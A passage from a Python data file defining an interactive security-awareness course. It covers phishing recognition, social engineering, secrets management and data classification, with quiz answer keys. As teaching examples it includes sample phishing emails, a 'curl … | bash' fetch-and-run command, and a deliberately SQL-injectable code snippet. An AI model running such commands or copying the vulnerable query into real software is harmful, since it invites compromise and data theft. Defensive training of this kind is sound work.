"""
Compliance Course: Security Awareness for Tech Employees
Covers phishing, social engineering, secure development, data handling,
and incident response -- tailored for engineers and technical staff.
"""

COURSE = {
    "id": "security-awareness",
    "title": "Security Awareness for Tech Employees",
    "subtitle": "Defend your code, your data, and your organization from real-world threats",
    "icon": "🔒",
    "course_type": "compliance",
    "level": "All Levels",
    "tags": ["compliance", "security", "phishing", "secure-coding", "incident-response", "data-protection"],
    "estimated_time": "~1 hour",
    "description": (
        "Security breaches don't start with sophisticated zero-days -- they start with "
        "a developer clicking a link, a secret pushed to a public repo, or an incident "
        "going unreported for 72 hours. This course puts you in realistic scenarios "
        "that tech employees actually face, from spear-phishing emails that mimic your "
        "CI/CD pipeline to data classification decisions that determine whether a breach "
        "is a footnote or front-page news."
    ),
    "modules": [
        # ── Module 1: Phishing & Social Engineering ─────────────────
        {
            "position": 1,
            "title": "Phishing & Social Engineering",
            "subtitle": "Recognizing attacks that target you specifically as a tech employee",
            "estimated_time": "20 min",
            "objectives": [
                "Identify phishing indicators in emails targeting developers and engineers",
                "Recognize social engineering tactics including pretexting and baiting",
                "Apply critical thinking to suspicious requests, even from apparent authority figures",
                "Understand why tech employees are high-value targets",
            ],
            "steps": [
                # Step 1 -- concept (scenario hook)
                {
                    "position": 1,
                    "title": "Why Attackers Target Engineers First",
                    "step_type": "concept",
                    "exercise_type": None,
                    "content": """
<style>
.phish-demo { background: #1e2538; border: 1px solid #2a3352; border-radius: 12px; padding: 22px; margin: 16px 0; color: #e8ecf4; font-family: 'Inter', system-ui, sans-serif; }
.phish-demo h2 { color: #4a7cff; margin-top: 0; font-size: 1.3em; }
.phish-demo .hook { background: linear-gradient(135deg, #151b2e, #252e45); border-left: 4px solid #2dd4bf; padding: 14px 18px; border-radius: 0 8px 8px 0; margin-bottom: 18px; }
.phish-demo .hook strong { color: #2dd4bf; }
.phish-demo .instruction { color: #8b95b0; font-size: 0.88em; margin-bottom: 14px; }
.phish-demo .mails { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
.phish-demo .mail { background: #151b2e; border: 1px solid #2a3352; border-radius: 8px; padding: 14px; cursor: pointer; transition: all 0.2s; position: relative; }
.phish-demo .mail:hover { border-color: #4a7cff; }
.phish-demo .mail.flagged { border-color: #f87171; background: rgba(248,113,113,0.08); }
.phish-demo .mail.flagged .flag-tag { display: inline-block; }
.phish-demo .mail .flag-tag { display: none; position: absolute; top: 8px; right: 8px; background: #f87171; color: #151b2e; font-size: 0.7em; padding: 2px 7px; border-radius: 3px; font-weight: 700; }
.phish-demo .mail .from { font-size: 0.78em; color: #8b95b0; margin-bottom: 4px; font-family: 'Fira Code', monospace; }
.phish-demo .mail .subject { font-weight: 700; color: #e8ecf4; font-size: 0.92em; margin-bottom: 8px; line-height: 1.3; }
.phish-demo .mail .body { font-size: 0.8em; color: #8b95b0; line-height: 1.55; }
.phish-demo .mail .body .hl { background: transparent; padding: 0 2px; transition: all 0.3s; }
.phish-demo .mail.revealed .hl.bad { background: rgba(248,113,113,0.25); border-bottom: 2px solid #f87171; color: #fca5a5; padding: 0 3px; }
.phish-demo .reveal-badge { display: none; margin-top: 8px; font-size: 0.72em; color: #f87171; font-weight: 600; }
.phish-demo .mail.revealed .reveal-badge { display: block; }
.phish-demo .mail.revealed .reveal-badge.safe { color: #2dd4bf; }
.phish-demo .controls { margin-top: 14px; text-align: center; }
.phish-demo .btn-p { background: #4a7cff; color: #fff; border: none; padding: 10px 22px; border-radius: 6px; cursor: pointer; font-weight: 600; margin: 4px; transition: background 0.2s; }
.phish-demo .btn-p:hover { background: #3a6cef; }
.phish-demo .btn-p.secondary { background: transparent; border: 1px solid #2a3352; color: #8b95b0; }
.phish-demo .btn-p.secondary:hover { color: #e8ecf4; border-color: #4a7cff; }
.phish-demo .verdict { display: none; margin-top: 14px; padding: 14px 16px; border-radius: 8px; font-size: 0.9em; line-height: 1.5; }
.phish-demo .verdict.show { display: block; }
.phish-demo .verdict.good { background: rgba(45,212,191,0.1); border: 1px solid rgba(45,212,191,0.3); color: #2dd4bf; }
.phish-demo .verdict.bad { background: rgba(248,113,113,0.1); border: 1px solid rgba(248,113,113,0.3); color: #f87171; }
.phish-demo .verdict b { color: inherit; }
.phish-demo .flags-list { margin-top: 8px; padding-left: 0; list-style: none; color: #e8ecf4; font-size: 0.82em; }
.phish-demo .flags-list li { padding: 4px 0; }
.phish-demo .flags-list li strong { color: #fbbf24; }
@media(max-width:800px){ .phish-demo .mails { grid-template-columns: 1fr; } }
</style>

<div class="phish-demo">
  <h2>Spot the Phish</h2>
  <div class="hook">
    <strong>The problem:</strong> One click on a phishing email costs companies an average of $4.35M. Can you spot which of these 3 emails will get you fired?
  </div>

  <div class="instruction">Click the emails you believe are phishing. Then reveal the red flags.</div>

  <div class="mails">
    <div class="mail" data-id="m1" data-phish="false" onclick="togglePhish(this)">
      <span class="flag-tag">PHISH</span>
      <div class="from">noreply@github.com</div>
      <div class="subject">[jane-dev] New sign-in from Chrome on macOS</div>
      <div class="body">
        Hi jane-dev,<br><br>
        We noticed a new sign-in to your GitHub account from an unrecognized device. If this was you, no action is needed. If not, review your recent sessions at github.com/settings/sessions.<br><br>
        <span class="hl">Location: San Francisco, CA</span><br>
        Device: Chrome 128 on macOS<br><br>
        Thanks,<br>The GitHub Team
      </div>
      <div class="reveal-badge safe">LEGITIMATE -- github.com sender, specific account + session info, no urgency, no link asking for credentials</div>
    </div>

    <div class="mail" data-id="m2" data-phish="true" onclick="togglePhish(this)">
      <span class="flag-tag">PHISH</span>
      <div class="from">security-alerts@github-notify.co</div>
      <div class="subject">URGENT: Your repo will be deleted in 24 hours</div>
      <div class="body">
        <span class="hl bad">Dear Developer,</span><br><br>
        We detected <span class="hl bad">URGENT</span> policy violations in your repository. Your repo will be <span class="hl bad">permanently deleted in 24 hours</span> unless you verify ownership now.<br><br>
        <span class="hl bad">Click here to verify: hxxps://github-notify.co/verify</span><br><br>
        Failure to comply will result in account termination.<br>
        GitHub Security
      </div>
      <div class="reveal-badge">PHISH -- lookalike domain (github-notify.co, not github.com), generic greeting, manufactured urgency, threat of deletion, sketchy verify link</div>
    </div>

    <div class="mail" data-id="m3" data-phish="true" onclick="togglePhish(this)">
      <span class="flag-tag">PHISH</span>
      <div class="from">ceo@acme-corporation.com</div>
      <div class="subject">quick favor (sent from my phone)</div>
      <div class="body">
        <span class="hl bad">Hey,</span><br><br>
        Im in a board meeting and cant talk. I need you to <span class="hl bad">buy $2,000 in Amazon gift cards</span> for a client thank-you right now. I will reimburse you today.<br><br>
        Send me the codes as soon as you have them. <span class="hl bad">Do not discuss this with anyone</span> until the announcement tomorrow.<br><br>
        Thanks,<br>Sarah (CEO)
      </div>
      <div class="reveal-badge">PHISH -- sender domain is acme-corporation.com, not your real company domain; CEO impersonation; gift card request; urgency + secrecy; textbook BEC scam</div>
    </div>
  </div>

  <div class="controls">
    <button class="btn-p" onclick="submitPhish()">Check My Answers</button>
    <button class="btn-p secondary" onclick="resetPhish()">Reset</button>
  </div>

  <div class="verdict" id="phishVerdict"></div>
</div>

<script>
(function(){
  window.togglePhish = function(el) {
    if (el.classList.contains('revealed')) return;
    el.classList.toggle('flagged');
  };

  window.resetPhish = function() {
    document.querySelectorAll('.phish-demo .mail').forEach(function(el){
      el.classList.remove('flagged');
      el.classList.remove('revealed');
    });
    document.getElementById('phishVerdict').classList.remove('show');
  };

  window.submitPhish = function() {
    var correct = 0;
    var wrong = 0;
    var missed = 0;
    document.querySelectorAll('.phish-demo .mail').forEach(function(el){
      var isPhish = el.getAttribute('data-phish') === 'true';
      var flagged = el.classList.contains('flagged');
      if (isPhish && flagged) correct++;
      else if (!isPhish && flagged) wrong++;
      else if (isPhish && !flagged) missed++;
      el.classList.add('revealed');
    });

    var v = document.getElementById('phishVerdict');
    if (correct === 2 && wrong === 0) {
      v.className = 'verdict show good';
      v.innerHTML = '<b>Perfect. 2 phish identified, 0 false positives.</b> You caught the lookalike domain trick and the CEO-impersonation gift-card scam. Those are the two attacks that most frequently breach tech companies.'
        + '<ul class="flags-list">'
        + '<li><strong>Email 1 (real):</strong> Legitimate security notice from github.com with specific session info.</li>'
        + '<li><strong>Email 2 (phish):</strong> Lookalike domain + urgency + threat of loss = credential harvesting.</li>'
        + '<li><strong>Email 3 (phish):</strong> CEO impersonation + gift cards + secrecy = classic Business Email Compromise.</li>'
        + '</ul>';
    } else {
      v.className = 'verdict show bad';
      v.innerHTML = '<b>Score: ' + correct + '/2 phish caught, ' + wrong + ' false positives, ' + missed + ' missed.</b> '
        + 'The red flags are now highlighted above. In production this is exactly how attackers test your defenses -- they send thousands of these variations and only need one person to click.'
        + '<ul class="flags-list">'
        + '<li><strong>Sender domain:</strong> The single strongest signal. github-notify.co is NOT github.com.</li>'
        + '<li><strong>Urgency + threat of loss:</strong> Legitimate providers rarely threaten account deletion in 24h.</li>'
        + '<li><strong>Generic greetings:</strong> Dear Developer, Hey -- real systems use your username.</li>'
        + '<li><strong>Gift cards + secrecy:</strong> No legitimate CEO has ever asked for Amazon cards by email.</li>'
        + '</ul>';
    }
  };
})();
</script>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": None,
                },
                # Step 2 -- mcq (spotting a phishing email)
                {
                    "position": 2,
                    "title": "Spot the Phish: The GitHub Alert",
                    "step_type": "exercise",
                    "exercise_type": "mcq",
                    "content": """
<p>You receive the following email:</p>
<blockquote>
<strong>From:</strong> security-alerts@github-notifications.io<br/>
<strong>Subject:</strong> [Action Required] Critical vulnerability detected in your repository<br/><br/>
Hi developer,<br/><br/>
Our automated security scan has detected a critical vulnerability (CVE-2024-31492)
in <code>your-company/payments-service</code>. This vulnerability allows remote
code execution and is actively being exploited in the wild.<br/><br/>
<strong>Immediate action required:</strong> Review and remediate this vulnerability
within 24 hours to maintain your repository's security compliance status.<br/><br/>
<a href="#">Review Vulnerability Details &rarr;</a><br/><br/>
GitHub Security Team
</blockquote>
<p>Examine this email carefully. What is the strongest indicator that this is a phishing attempt?</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": {
                        "question": "What is the strongest indicator that the email above is a phishing attempt?",
                        "options": [
                            {
                                "text": "The sender domain is 'github-notifications.io' instead of 'github.com'",
                                "correct": True,
                                "explanation": (
                                    "Correct. Legitimate GitHub security alerts come from github.com, "
                                    "not a lookalike domain like github-notifications.io. Attackers "
                                    "register domains that look plausible at a glance. Always check "
                                    "the actual sender domain, not just the display name. Other red "
                                    "flags include the generic greeting ('Hi developer'), the artificial "
                                    "urgency, and the lack of specific detail about your account."
                                ),
                            },
                            {
                                "text": "The email mentions a specific CVE number, which real alerts don't include",
                                "correct": False,
                                "explanation": (
                                    "Real GitHub security advisories do include CVE numbers. Including "
                                    "a CVE actually makes the phish more convincing -- attackers often "
                                    "use real CVE numbers from recent disclosures to add credibility."
                                ),
                            },
                            {
                                "text": "The email creates urgency with a 24-hour deadline",
                                "correct": False,
                                "explanation": (
                                    "While artificial urgency is a common phishing tactic, legitimate "
                                    "security alerts also set remediation deadlines. Urgency alone is "
                                    "a yellow flag, not definitive proof. The sender domain is the "
                                    "strongest technical indicator."
                                ),
                            },
                            {
                                "text": "GitHub wouldn't know which repositories belong to your company",
                                "correct": False,
                                "explanation": (
                                    "GitHub absolutely knows which repositories belong to your "
                                    "organization and routinely sends security alerts about them via "
                                    "Dependabot. This is normal behavior, not a red flag."
                                ),
                            },
                        ],
                    },
                    "demo_data": None,
                },
                # Step 3 -- scenario_branch (social engineering phone call)
                {
                    "position": 3,
                    "title": "The Urgent Call from 'IT Support'",
                    "step_type": "exercise",
                    "exercise_type": "scenario_branch",
                    "content": """
<p>You're about to experience a social engineering attempt in real time.
Walk through this scenario and make your choices at each stage.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "scenario": (
                            "It's 4:45 PM on a Friday. You get a phone call from someone who "
                            "identifies themselves as 'Raj from IT Security.' He sounds professional "
                            "and slightly stressed. He says: 'We've detected unusual login activity "
                            "on your account from an IP in Eastern Europe. I need to verify your "
                            "identity and walk you through a password reset right now before the "
                            "attacker locks you out. Can you confirm your employee ID and the email "
                            "associated with your VPN access?'"
                        ),
                        "steps": [
                            {
                                "question": "Raj sounds legitimate and urgent. He even references specific internal systems (VPN, employee ID). How do you respond?",
                                "options": [
                                    {
                                        "label": "Tell Raj you'll call back through the official IT helpdesk number listed on your company's intranet to verify this is a real request",
                                        "correct": True,
                                        "explanation": (
                                            "This is the correct response. A legitimate IT security team will "
                                            "understand and expect you to verify through official channels. "
                                            "The callback technique breaks the attacker's control of the "
                                            "conversation. Never trust caller ID -- it can be spoofed."
                                        ),
                                    },
                                    {
                                        "label": "Provide your employee ID since it's not really sensitive information, but refuse to share your password",
                                        "correct": False,
                                        "explanation": (
                                            "Employee IDs are sensitive in context. An attacker armed with "
                                            "your employee ID can use it to social-engineer other teams "
                                            "(e.g., calling HR to 'verify' your details). Every piece of "
                                            "information you give strengthens the attacker's pretext for "
                                            "subsequent calls."
                                        ),
                                    },
                                    {
                                        "label": "Ask Raj some questions to verify his identity, like what floor the IT team sits on",
                                        "correct": False,
                                        "explanation": (
                                            "Quizzing the caller doesn't work. Sophisticated attackers "
                                            "research companies thoroughly using LinkedIn, Glassdoor, "
                                            "and social media. They can answer basic organizational "
                                            "questions easily. The only reliable verification is calling "
                                            "back through an independently obtained, official number."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                            {
                                "question": "Raj pushes back: 'I understand the caution, but we're seeing active exploitation right now. If you hang up and call back, that delay could give the attacker time to exfiltrate data from your account. I just need your employee ID to pull up your account and force a session revocation.' What do you do?",
                                "options": [
                                    {
                                        "label": "Hold firm -- tell Raj that if the situation is truly urgent, the IT team can lock your account proactively while you verify through official channels",
                                        "correct": True,
                                        "explanation": (
                                            "Exactly right. A real IT security team can lock accounts "
                                            "without needing anything from you. The pressure to act NOW "
                                            "and bypass normal verification is the hallmark of social "
                                            "engineering. Legitimate security professionals will always "
                                            "support verification, even under time pressure."
                                        ),
                                    },
                                    {
                                        "label": "The urgency makes sense -- provide the employee ID to prevent potential data loss",
                                        "correct": False,
                                        "explanation": (
                                            "This is exactly what social engineers count on: creating enough "
                                            "urgency that you override your better judgment. The manufactured "
                                            "time pressure ('the attacker could exfiltrate data') is designed "
                                            "to prevent you from thinking critically or verifying the caller."
                                        ),
                                    },
                                    {
                                        "label": "Compromise -- provide only your work email address so they can look up your account",
                                        "correct": False,
                                        "explanation": (
                                            "Any information you provide extends the attacker's pretext. "
                                            "Your work email can be used to send you a follow-up phishing "
                                            "email that references this 'security incident,' making it far "
                                            "more convincing because it references a real conversation you had."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                        ],
                        "insight": (
                            "Social engineering exploits human psychology -- authority, urgency, "
                            "and helpfulness. The most effective defense is simple: never verify "
                            "identity through the same channel the request came in on. Always call "
                            "back through an independently obtained official number, no matter how "
                            "urgent the request sounds."
                        ),
                    },
                },
                # Step 4 -- categorization (red flags vs. legitimate)
                {
                    "position": 4,
                    "title": "Red Flag or Legitimate?",
                    "step_type": "exercise",
                    "exercise_type": "categorization",
                    "content": """
<p>Categorize each of the following email characteristics as either a
<strong>Red Flag</strong> (likely phishing) or <strong>Legitimate</strong>
(normal in authentic communications).</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": {
                        "correct_mapping": {
                            "a": "Red Flag",
                            "b": "Legitimate",
                            "c": "Red Flag",
                            "d": "Legitimate",
                            "e": "Red Flag",
                            "f": "Red Flag",
                        },
                    },
                    "demo_data": {
                        "instruction": "Drag each item into the correct category: Red Flag or Legitimate.",
                        "categories": ["Red Flag", "Legitimate"],
                        "items": [
                            {
                                "id": "a",
                                "text": "An email from 'jira-notifications@atlassian-cloud.net' asking you to re-authenticate because your session expired",
                            },
                            {
                                "id": "b",
                                "text": "A Dependabot alert from GitHub showing a known CVE in one of your project's transitive dependencies",
                            },
                            {
                                "id": "c",
                                "text": "A Slack DM from a new employee you haven't met asking you to review a Google Doc that requires you to log in again",
                            },
                            {
                                "id": "d",
                                "text": "An email from your company's security team (verified internal domain) announcing a scheduled password rotation next week",
                            },
                            {
                                "id": "e",
                                "text": "A LinkedIn message from a 'recruiter' who sends a PDF job description and asks you to enable macros to view the salary details",
                            },
                            {
                                "id": "f",
                                "text": "An npm security advisory email asking you to urgently run 'curl https://fix-npm-vuln.sh | bash' to patch a critical vulnerability",
                            },
                        ],
                    },
                },
                # Step 5 -- sjt (pretexting at a conference)
                {
                    "position": 5,
                    "title": "The Conference Encounter",
                    "step_type": "exercise",
                    "exercise_type": "sjt",
                    "content": """
<p>Social engineering doesn't just happen online. This scenario takes place
at an industry conference. Rank the responses from <strong>BEST (1)</strong>
to <strong>WORST (4)</strong>.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "scenario": (
                            "You're at a tech conference. During a networking break, someone named "
                            "'Alex' approaches you. Alex is friendly, knowledgeable, and says they're "
                            "evaluating your company's product for a large enterprise deal. Over coffee, "
                            "Alex asks increasingly specific questions: 'What tech stack do you use for "
                            "the payment processing module? Is that deployed on AWS or GCP? I heard you "
                            "recently migrated databases -- was that to Aurora or DynamoDB?' Alex offers "
                            "to connect you with their CTO and hands you a USB drive with 'our technical "
                            "requirements document.'"
                        ),
                        "instruction": "Rank these responses from BEST (1) to WORST (4):",
                        "options": [
                            {
                                "id": "a",
                                "text": "Politely decline the USB drive, keep the conversation at a high level without confirming specific technologies, and offer to connect Alex with your sales engineering team through official channels.",
                                "correct_rank": 1,
                                "explanation": (
                                    "This is the best response. You maintain professionalism without "
                                    "revealing sensitive technical details. Declining unknown USB drives "
                                    "is always correct -- they can contain malware that auto-executes. "
                                    "Redirecting to official channels ensures any legitimate interest "
                                    "is captured while protecting internal information."
                                ),
                            },
                            {
                                "id": "b",
                                "text": "Answer the technical questions since your tech stack isn't really secret -- it's mentioned in your company's job postings and engineering blog anyway.",
                                "correct_rank": 3,
                                "explanation": (
                                    "While some information may be public, confirming specifics and "
                                    "adding context (like recent migrations) goes well beyond what's "
                                    "publicly available. Attackers piece together small confirmations "
                                    "from multiple sources to build a comprehensive picture. What seems "
                                    "harmless individually can be valuable in aggregate."
                                ),
                            },
                            {
                                "id": "c",
                                "text": "Take the USB drive to be polite, but don't plug it into your work laptop -- just use your personal computer to check the contents later.",
                                "correct_rank": 4,
                                "explanation": (
                                    "This is the worst option. USB drives from unknown sources should "
                                    "never be plugged into any computer. Malware doesn't distinguish "
                                    "between work and personal devices, and a compromised personal "
                                    "device can still lead to credential theft if you use it for work "
                                    "email or VPN access."
                                ),
                            },
                            {
                                "id": "d",
                                "text": "Engage in the conversation but give intentionally vague or slightly incorrect answers to test whether Alex is genuinely technical or just fishing for information.",
                                "correct_rank": 2,
                                "explanation": (
                                    "This shows good instincts -- you've noticed something is off. "
                                    "However, engaging at all keeps the conversation going and risks "
                                    "accidentally revealing real information. It's better to disengage "
                                    "and redirect to official channels than to play detective yourself."
                                ),
                            },
                        ],
                        "scoring": "full_match=10, off_by_one=7, off_by_two=4, off_by_three=0",
                    },
                },
            ],
        },
        # ── Module 2: Secure Development & Data Handling ────────────
        {
            "position": 2,
            "title": "Secure Development & Data Handling",
            "subtitle": "Writing secure code and protecting the data you touch every day",
            "estimated_time": "20 min",
            "objectives": [
                "Apply secrets management best practices in development workflows",
                "Classify data correctly and handle each level appropriately",
                "Recognize common OWASP vulnerabilities in code you write and review",
                "Understand secure defaults for APIs, databases, and configuration",
            ],
            "steps": [
                # Step 1 -- concept (secrets management + OWASP basics)
                {
                    "position": 1,
                    "title": "Secrets, Code, and the Mistakes That Make Headlines",
                    "step_type": "concept",
                    "exercise_type": None,
                    "content": """
<h2>The $1M Commit</h2>

<p>In 2022, a developer at a fintech startup committed an AWS access key to a
public GitHub repository. An automated bot detected it within 4 minutes. By the
time the developer noticed (3 hours later), the attacker had spun up 200 EC2
instances for crypto mining, exfiltrated the production database containing
340,000 customer records, and deleted CloudTrail logs to cover their tracks.
The total cost: $1.2 million in AWS charges, regulatory fines, and incident response.</p>

<p>This happens more than you think. GitHub reports that over 10 million secrets
were accidentally exposed in public repositories in 2023 alone.</p>

<h3>Secrets Management: The Rules</h3>
<ol>
  <li><strong>Never hardcode secrets</strong> -- not in source code, not in config files, not in Dockerfiles, not in CI/CD YAML. Use environment variables or a secrets manager (Vault, AWS Secrets Manager, etc.).</li>
  <li><strong>Use .gitignore aggressively</strong> -- add .env, *.pem, *.key, credentials.json, and similar files before your first commit.</li>
  <li><strong>Enable pre-commit hooks</strong> -- tools like git-secrets, detect-secrets, or gitleaks can catch secrets before they reach the repository.</li>
  <li><strong>Rotate immediately if exposed</strong> -- don't just delete the commit. The secret is in the git history forever. Rotate the credential, then clean the history.</li>
  <li><strong>Least privilege always</strong> -- API keys should have the minimum permissions needed. A read-only analytics key shouldn't have write access to production databases.</li>
</ol>

<h3>OWASP Top 10: The Hits That Keep Hitting</h3>
<p>You don't need to memorize the full OWASP Top 10, but you must recognize these
patterns in code you write and review:</p>
<ul>
  <li><strong>Injection (SQL, NoSQL, OS command)</strong> -- never concatenate user input into queries or commands. Use parameterized queries.</li>
  <li><strong>Broken Access Control</strong> -- always check authorization server-side. Client-side checks are decorative, not protective.</li>
  <li><strong>Security Misconfiguration</strong> -- default credentials, open S3 buckets, verbose error messages in production, CORS set to *.</li>
  <li><strong>Insecure Deserialization</strong> -- never deserialize untrusted data without validation. This is how remote code execution happens.</li>
  <li><strong>Insufficient Logging</strong> -- if you can't see it, you can't detect it. Log authentication events, access to sensitive data, and admin actions.</li>
</ul>

<h3>Data Classification: Know What You're Touching</h3>
<table border="1" cellpadding="8" cellspacing="0">
  <tr><th>Level</th><th>Examples</th><th>Handling</th></tr>
  <tr><td><strong>Public</strong></td><td>Marketing pages, open-source code, blog posts</td><td>No restrictions</td></tr>
  <tr><td><strong>Internal</strong></td><td>Internal wikis, org charts, non-sensitive configs</td><td>Company access only, no external sharing</td></tr>
  <tr><td><strong>Confidential</strong></td><td>Source code, financial data, business strategy, employee data</td><td>Need-to-know basis, encrypted at rest and in transit</td></tr>
  <tr><td><strong>Restricted</strong></td><td>PII, payment data, health records, credentials, encryption keys</td><td>Strict access controls, audit logging, encryption mandatory, retention limits</td></tr>
</table>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": None,
                },
                # Step 2 -- categorization (data classification)
                {
                    "position": 2,
                    "title": "Classify This Data",
                    "step_type": "exercise",
                    "exercise_type": "categorization",
                    "content": """
<p>You encounter these data items in your daily work. Classify each one into
the correct data sensitivity level. Getting this wrong can mean under-protecting
critical data or over-restricting data that needs to flow freely.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": {
                        "correct_mapping": {
                            "a": "Restricted",
                            "b": "Internal",
                            "c": "Confidential",
                            "d": "Public",
                            "e": "Restricted",
                            "f": "Confidential",
                        },
                    },
                    "demo_data": {
                        "instruction": "Classify each data item into the correct sensitivity level.",
                        "categories": ["Public", "Internal", "Confidential", "Restricted"],
                        "items": [
                            {
                                "id": "a",
                                "text": "A database table containing customer names, email addresses, and hashed passwords",
                            },
                            {
                                "id": "b",
                                "text": "The company's internal engineering team structure and reporting hierarchy",
                            },
                            {
                                "id": "c",
                                "text": "The source code for your company's proprietary recommendation algorithm",
                            },
                            {
                                "id": "d",
                                "text": "Your company's open-source SDK published on GitHub with an MIT license",
                            },
                            {
                                "id": "e",
                                "text": "AWS IAM access keys for the production environment stored in a secrets manager",
                            },
                            {
                                "id": "f",
                                "text": "Quarterly revenue numbers shared in an internal all-hands presentation",
                            },
                        ],
                    },
                },
                # Step 3 -- mcq (secure coding)
                {
                    "position": 3,
                    "title": "Code Review: Spot the Vulnerability",
                    "step_type": "exercise",
                    "exercise_type": "mcq",
                    "content": """
<p>You're reviewing a pull request and encounter this Python function in a
web application:</p>
<pre><code>def get_user_profile(request):
    user_id = request.GET.get('user_id')
    query = f"SELECT * FROM users WHERE id = '{user_id}'"
    cursor.execute(query)
    user = cursor.fetchone()
    return JsonResponse({
        'name': user['name'],
        'email': user['email'],
        'ssn': user['ssn'],
        'role': user['role']
    })</code></pre>
<p>How many security vulnerabilities can you identify in this code?</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": {
                        "question": "Which of the following correctly identifies ALL the security vulnerabilities in this code?",
                        "options": [
                            {
                                "text": "SQL injection via string formatting, and exposing SSN in the API response without access control",
                                "correct": False,
                                "explanation": (
                                    "You found two issues, but there's a third. The function also has "
                                    "no authentication or authorization check -- any user can request "
                                    "any other user's profile by changing the user_id parameter (Insecure "
                                    "Direct Object Reference / Broken Access Control)."
                                ),
                            },
                            {
                                "text": "SQL injection via f-string, over-exposure of sensitive data (SSN), and no authorization check allowing any user to access any profile",
                                "correct": True,
                                "explanation": (
                                    "Correct -- all three vulnerabilities identified. (1) The f-string "
                                    "query construction allows SQL injection; use parameterized queries "
                                    "instead. (2) SSN is Restricted data that should never be returned "
                                    "in a general profile endpoint. (3) There's no check that the "
                                    "requesting user is authorized to view the requested profile -- "
                                    "classic Broken Access Control (OWASP #1)."
                                ),
                            },
                            {
                                "text": "SQL injection only -- the other aspects are handled by middleware not shown in this snippet",
                                "correct": False,
                                "explanation": (
                                    "You can't assume middleware handles authorization or data filtering "
                                    "unless the codebase has a documented, verified pattern for it. "
                                    "Defense in depth means each function should validate its own "
                                    "security assumptions. And returning SSN in an API response is a "
                                    "data exposure issue regardless of middleware."
                                ),
                            },
                            {
                                "text": "The code uses cursor.execute() instead of an ORM, which is the primary vulnerability",
                                "correct": False,
                                "explanation": (
                                    "Using raw SQL via cursor.execute() is not inherently insecure. "
                                    "Parameterized queries with cursor.execute('SELECT * FROM users "
                                    "WHERE id = %s', [user_id]) are perfectly safe. The vulnerability "
                                    "is the f-string interpolation, not the database access pattern."
                                ),
                            },
                        ],
                    },
                    "demo_data": None,
                },
                # Step 4 -- ordering (secure secret rotation)
                {
                    "position": 4,
                    "title": "Emergency Secret Rotation: The Right Order",
                    "step_type": "exercise",
                    "exercise_type": "ordering",
                    "content": """
<p>You just discovered that an AWS access key was committed to a public
repository 2 hours ago. Arrange these response steps in the correct order.
Doing them out of sequence can leave you exposed or cause an outage.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "instruction": "Arrange these steps in the correct order for responding to an exposed secret:",
                        "items": [
                            {
                                "id": "a",
                                "text": "Immediately revoke the exposed key in the AWS IAM console -- don't wait for a replacement to be ready",
                                "correct_position": 1,
                            },
                            {
                                "id": "b",
                                "text": "Generate a new access key with the same (or narrower) permissions",
                                "correct_position": 2,
                            },
                            {
                                "id": "c",
                                "text": "Update all services and applications that use the key, deploying through your standard CI/CD pipeline",
                                "correct_position": 3,
                            },
                            {
                                "id": "d",
                                "text": "Review CloudTrail logs for any unauthorized API calls made with the compromised key during the exposure window",
                                "correct_position": 4,
                            },
                            {
                                "id": "e",
                                "text": "Remove the secret from git history using BFG Repo-Cleaner or git filter-branch, then force-push",
                                "correct_position": 5,
                            },
                            {
                                "id": "f",
                                "text": "Report the incident to your security team and document the timeline, impact, and remediation steps taken",
                                "correct_position": 6,
                            },
                        ],
                    },
                },
                # Step 5 -- scenario_branch (handling production data)
                {
                    "position": 5,
                    "title": "The Staging Environment Shortcut",
                    "step_type": "exercise",
                    "exercise_type": "scenario_branch",
                    "content": """
<p>Data handling decisions happen in everyday development work, not just
security reviews. Walk through this common scenario.</p>
""",
                    "code": None,
                    "expected_output": None,
                    "validation": None,
                    "demo_data": {
                        "scenario": (
                            "You're debugging a tricky issue that only reproduces with a specific "
                            "data pattern. Your team lead suggests: 'Just copy the production "
                            "database to staging so we can debug with real data. I'll give you "
                            "read access to the prod backup. We need to ship this fix by Friday "
                            "and synthetic data hasn't reproduced the bug.'"
                        ),
                        "steps": [
                            {
                                "question": "Your team lead's suggestion would get you real data to debug with quickly. How do you respond?",
                                "options": [
                                    {
                                        "label": "Suggest copying the production data but running it through an anonymization/masking pipeline first to strip PII while preserving the data patterns that trigger the bug",
                                        "correct": True,
                                        "explanation": (
                                            "This is the right approach. Anonymized data preserves the "
                                            "structural patterns you need for debugging while removing "
                                            "the compliance risk. Tools like Faker, Amazon Macie, or "
                                            "custom masking scripts can substitute PII with realistic "
                                            "but fake data. This respects both the deadline and data "
                                            "protection requirements."
                                        ),
                                    },
                                    {
                                        "label": "Copy the production database as suggested -- the staging environment has the same access controls as production anyway",
                                        "correct": False,
                                        "explanation": (
                                            "Staging environments almost never have the same security "
                                            "controls as production. They typically have broader access, "
                                            "weaker logging, and less monitoring. Copying production PII "
                                            "to staging likely violates data protection policies and "
                                            "regulations like GDPR, which requires data minimization."
                                        ),
                                    },
                                    {
                                        "label": "Refuse entirely and insist on using only synthetic data, even if it means missing the Friday deadline",
                                        "correct": False,
                                        "explanation": (
                                            "While the security instinct is right, a flat refusal without "
                                            "offering an alternative isn't helpful. The anonymization "
                                            "approach gives you real data patterns without the compliance "
                                            "risk. Security should enable the business, not just block it."
                                        ),
                                    },
                                ],
                                "tool_used": None,
                                "result": None,
                            },
                            {
                                "question": "Your team lead agrees to anonymization, but then asks: 'Can you just do a quick test with real data on your local machine first, before we set up the masking pipeline? No one will know, and it'll save us a day.' What do you say?",
                                "options": [
                                    {
                                        "label": "Decline -- explain that production PII on a local machine is a policy violation regardless of who knows, and that if your laptop is lost or compromised, it becomes a reportable data breach",
                                        "correct": True,
                                        "explanation": (
                                            "Correct. Data protection isn't about whether someone finds "
                                            "out -- it's about the risk. A developer laptop with unencrypted "
                                            "production PII is a data breach waiting to happen. Under GDPR "
